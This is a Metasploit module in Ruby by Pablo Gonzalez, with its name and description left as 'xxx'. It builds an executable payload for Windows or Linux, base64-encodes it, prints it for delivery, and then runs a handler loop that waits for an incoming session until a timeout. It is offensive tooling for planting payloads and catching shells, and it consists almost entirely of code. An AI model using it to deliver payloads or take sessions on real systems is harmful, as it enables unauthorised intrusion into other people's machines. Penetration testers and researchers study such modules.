##
# This module requires Metasploit
# Pablo Gonzalez
##

require 'msf/core'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'xxx',
      'Description' => %q{
        xxx
      },
      'Author' => [
        'Pablo GonzÃ¡lez' 
      ],
      'Payload'        =>
        {
		  'Space'       => 10000000,
          'DisableNops' => true,
		  'BadChars'	=> "\x00\x0a\x0d",
        },
      'Targets'        =>
        [
	      [ 'Windows Universal', 
		  { 
			'Platform'       => 'win',
            'Arch'           => [ ARCH_X86 ]
		  } ],
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64
            }
          ]
        ],
      'DefaultTarget' => 0,
      'License' => MSF_LICENSE
    ))

  end

  def exploit
  pay = payload.encoded_exe
	print_status "Payload: #{datastore['PAYLOAD']}"
	print_status "Length: #{pay.length.to_s}"
	enc = Base64.encode64(pay).chomp
	enc.gsub!("\n","")
	print_status enc 
	
	datastore['ExitOnSession'] = true
	
	if not datastore['ExitOnSession'] and not job_id
      fail_with(Failure::Unknown, "Setting ExitOnSession to false requires running as a job (exploit -j)")
    end

    stime = Time.now.to_f
	
	print_status "Starting the payload handler..."
    while(true)
      break if session_created? and datastore['ExitOnSession']
      break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )

      select(nil,nil,nil,1)
    end
  end
end
